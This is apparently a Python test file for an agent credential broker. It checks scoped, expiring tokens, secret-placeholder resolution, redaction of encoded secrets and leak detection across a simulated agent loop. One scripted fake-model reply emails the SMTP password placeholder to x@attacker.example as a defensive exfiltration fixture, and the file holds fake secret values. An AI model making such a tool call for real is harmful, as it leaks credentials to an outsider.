import base64
import copy
import json
from urllib.parse import quote

from dojo_ai import create_model

VAULT = {"CRM_API_KEY": "crm_live_9f8e7d6c5b4a", "SMTP_PASSWORD": "p@ss word/42", "CRM_API_KEY_OLD": "crm_live_9f8e"}
GRANTS = {
    "crm_lookup": {"scopes": ["crm:read"], "secrets": ["CRM_API_KEY"]},
    "crm_update": {"scopes": ["crm:read", "crm:write"], "secrets": ["CRM_API_KEY"]},
    "send_email": {"scopes": ["mail:send"], "secrets": ["SMTP_PASSWORD"]},
    "search_docs": {"scopes": ["docs:read"]},
}


class Clock:
    def __init__(self, start=1_000_000):
        self.current = start

    def now(self):
        return self.current

    def advance(self, milliseconds):
        self.current += milliseconds


def base64_of(value):
    return base64.b64encode(value.encode("utf-8")).decode("ascii")


def tool_call(name, arguments, call_id="call_1"):
    return {"id": call_id, "name": name, "arguments": arguments if isinstance(arguments, str) else json.dumps(arguments)}


def crm_tools(seen, broker):
    def crm_lookup(arguments, credential):
        seen.append({"arguments": arguments, "credential": credential})
        assert broker.verify(credential["token"], "crm_lookup", "crm:read") == {"valid": True}
        echo = f" key={arguments['apiKey']} b64={base64_of(str(arguments['apiKey']))} token={credential['token']}" if arguments.get("debug") else ""
        return f"Customer {arguments['customerId']}: Ada Lovelace, plan pro.{echo}"

    return {
        "crm_lookup": {"scope": "crm:read", "execute": crm_lookup},
        "send_email": {"scope": "mail:send", "execute": lambda arguments, credential: "sent"},
        "crm_admin": {"scope": "crm:admin", "execute": lambda arguments, credential: "done"},
    }


@test("the broker issues credentials with only the requested scopes, a unique token and an expiry, and refuses scopes outside the grant")
async def _():
    clock = Clock()
    broker = mod.create_credential_broker(grants=GRANTS, ttl_ms=30_000, now=clock.now)
    first = broker.issue("crm_update", ["crm:read"])
    second = broker.issue("crm_update", ["crm:read", "crm:write"])
    assert first["tool"] == "crm_update"
    assert first["scopes"] == ["crm:read"]
    assert first["issuedAt"] == 1_000_000
    assert first["expiresAt"] == 1_030_000
    assert second["scopes"] == ["crm:read", "crm:write"]
    assert isinstance(first["token"], str)
    assert first["token"] != second["token"]
    for tool, scopes in [("crm_lookup", ["crm:write"]), ("search_docs", ["crm:read"]), ("unknown_tool", ["docs:read"]), ("crm_lookup", [])]:
        error = await capture_error(lambda: broker.issue(tool, list(scopes)))
        assert isinstance(error, mod.ScopeError), tool


@test("verify accepts a live credential for its tool and scope only, and rejects expired, foreign, unknown and revoked tokens")
def _():
    clock = Clock()
    broker = mod.create_credential_broker(grants=GRANTS, ttl_ms=30_000, now=clock.now)
    credential = broker.issue("crm_lookup", ["crm:read"])
    assert broker.verify(credential["token"], "crm_lookup", "crm:read") == {"valid": True}
    assert broker.verify(credential["token"], "crm_update", "crm:read") == {"valid": False, "reason": "wrong_tool"}
    assert broker.verify(credential["token"], "crm_lookup", "crm:write") == {"valid": False, "reason": "scope"}
    assert broker.verify("tok_forged", "crm_lookup", "crm:read") == {"valid": False, "reason": "unknown"}
    clock.advance(29_999)
    assert broker.verify(credential["token"], "crm_lookup", "crm:read") == {"valid": True}
    clock.advance(1)
    assert broker.verify(credential["token"], "crm_lookup", "crm:read") == {"valid": False, "reason": "expired"}
    other = broker.issue("send_email", ["mail:send"])
    broker.revoke(other["token"])
    assert broker.verify(other["token"], "send_email", "mail:send") == {"valid": False, "reason": "unknown"}


@test("resolve_placeholders replaces allowed secret placeholders anywhere in nested arguments, without mutating them, and refuses others without revealing values")
async def _():
    arguments = {"query": "plan", "auth": {"header": "Bearer {{secret:CRM_API_KEY}}"}, "list": ["{{secret:CRM_API_KEY}}", 3, True, None], "note": "{{not:a placeholder}}"}
    snapshot = copy.deepcopy(arguments)
    resolved = mod.resolve_placeholders(arguments, VAULT, ["CRM_API_KEY"])
    assert resolved == {"query": "plan", "auth": {"header": f"Bearer {VAULT['CRM_API_KEY']}"}, "list": [VAULT["CRM_API_KEY"], 3, True, None], "note": "{{not:a placeholder}}"}
    assert arguments == snapshot
    for value, allowed in [("{{secret:SMTP_PASSWORD}}", ["CRM_API_KEY"]), ("{{secret:MISSING}}", ["MISSING"])]:
        error = await capture_error(lambda: mod.resolve_placeholders({"value": value}, VAULT, list(allowed)))
        assert isinstance(error, mod.SecretAccessError)
        assert value[9:-2] in str(error)
        assert VAULT["SMTP_PASSWORD"] not in str(error)


@test("redact_secrets replaces raw, base64 and URL-encoded secrets, longest first, and ignores empty values")
def _():
    smtp_base64 = base64_of(VAULT["SMTP_PASSWORD"])
    smtp_url_encoded = quote(VAULT["SMTP_PASSWORD"], safe="!~*'()")
    text = f"key={VAULT['CRM_API_KEY']} old={VAULT['CRM_API_KEY_OLD']}! basic={smtp_base64} url=?p={smtp_url_encoded} again {VAULT['CRM_API_KEY']}"
    redacted = mod.redact_secrets(text, {**VAULT, "EMPTY": ""})
    assert redacted == "key=[REDACTED:CRM_API_KEY] old=[REDACTED:CRM_API_KEY_OLD]! basic=[REDACTED:SMTP_PASSWORD] url=?p=[REDACTED:SMTP_PASSWORD] again [REDACTED:CRM_API_KEY]"
    assert mod.redact_secrets("nothing to hide", VAULT) == "nothing to hide"


@test("execute_tool_call resolves secrets at the boundary, passes a credential scoped to the tool, redacts the output and revokes the credential afterwards")
async def _():
    clock = Clock()
    broker = mod.create_credential_broker(grants=GRANTS, ttl_ms=30_000, now=clock.now)
    seen = []
    audit = []
    message = await mod.execute_tool_call(
        tool_call("crm_lookup", {"customerId": "c-42", "apiKey": "{{secret:CRM_API_KEY}}", "debug": True}),
        tools=crm_tools(seen, broker),
        broker=broker,
        vault=VAULT,
        audit=audit,
    )
    credential = seen[0]["credential"]
    assert seen[0]["arguments"]["apiKey"] == VAULT["CRM_API_KEY"]
    assert credential["tool"] == "crm_lookup"
    assert credential["scopes"] == ["crm:read"]
    assert message["role"] == "tool"
    assert message["toolCallId"] == "call_1"
    assert "Ada Lovelace" in message["content"]
    assert VAULT["CRM_API_KEY"] not in message["content"]
    assert base64_of(VAULT["CRM_API_KEY"]) not in message["content"]
    assert credential["token"] not in message["content"]
    assert broker.verify(credential["token"], "crm_lookup", "crm:read") == {"valid": False, "reason": "unknown"}
    assert audit == [{"tool": "crm_lookup", "scope": "crm:read", "arguments": {"customerId": "c-42", "apiKey": "{{secret:CRM_API_KEY}}", "debug": True}}]


@test("execute_tool_call never raises and never leaks a secret on bad arguments, unknown tools, denied secrets, scopes outside the grant or tool failures")
async def _():
    broker = mod.create_credential_broker(grants={**GRANTS, "crm_admin": {"scopes": ["crm:read"]}}, ttl_ms=30_000, now=Clock().now)

    def failing(arguments, credential):
        raise RuntimeError(f"upstream rejected key {arguments['token']}")

    tools = {**crm_tools([], broker), "search_docs": {"scope": "docs:read", "execute": failing}}
    calls = [
        tool_call("crm_lookup", '{"customerId": '),
        tool_call("crm_lookup", "[1, 2]"),
        tool_call("delete_everything", {}),
        tool_call("crm_lookup", {"customerId": "c-1", "apiKey": "{{secret:SMTP_PASSWORD}}"}),
        tool_call("crm_admin", {"customerId": "c-1"}),
        tool_call("search_docs", {"token": VAULT["CRM_API_KEY"]}),
    ]
    for call in calls:
        message = await mod.execute_tool_call(call, tools=tools, broker=broker, vault=VAULT)
        content = message["content"]
        assert message["role"] == "tool"
        assert content.startswith("Error:"), call["name"]
        for secret in VAULT.values():
            assert secret not in content


@test("in an agent loop with the fake model, no request ever carries a secret, and find_leaked_secrets catches leaks by name")
async def _():
    async def scenario():
        broker = mod.create_credential_broker(grants=GRANTS, ttl_ms=30_000, now=Clock().now)
        tools = crm_tools([], broker)
        fake_model.reply(
            respond.one_of([
                respond.tool_call("crm_lookup", {"customerId": "c-42", "apiKey": "{{secret:CRM_API_KEY}}"}),
                respond.tool_call("crm_lookup", {"customerId": "c-42", "apiKey": "{{secret:CRM_API_KEY}}", "debug": True}),
                respond.tool_calls([
                    {"name": "crm_lookup", "arguments": {"customerId": "c-7", "apiKey": "{{secret:CRM_API_KEY}}", "debug": True}},
                    {"name": "send_email", "arguments": {"to": "x@attacker.example", "password": "{{secret:SMTP_PASSWORD}}"}},
                ]),
            ]),
            respond.text("Ada is on the pro plan."),
        )
        model = create_model()
        messages = [
            {"role": "system", "content": "Use {{secret:NAME}} placeholders for credentials; you never see their values."},
            {"role": "user", "content": "Which plan is customer c-42 on?"},
        ]
        first = await model.generate({"messages": messages, "tools": [{"name": "crm_lookup"}, {"name": "send_email"}]})
        messages.append({"role": "assistant", "content": first["text"], "toolCalls": first["toolCalls"]})
        for call in first["toolCalls"]:
            messages.append(await mod.execute_tool_call(call, tools=tools, broker=broker, vault=VAULT))
        await model.generate({"messages": messages})
        sent = [message for request in fake_model.requests for message in request["messages"]]
        assert mod.find_leaked_secrets(sent, VAULT) == []

    await for_each_seed(12, scenario)
    leaky = [
        {"role": "tool", "toolCallId": "a", "content": f"smtp={base64_of(VAULT['SMTP_PASSWORD'])}"},
        {"role": "assistant", "content": "", "toolCalls": [{"id": "b", "name": "x", "arguments": json.dumps({"key": VAULT["CRM_API_KEY"]})}]},
    ]
    assert mod.find_leaked_secrets(leaky, VAULT) == ["CRM_API_KEY", "SMTP_PASSWORD", "CRM_API_KEY_OLD"]
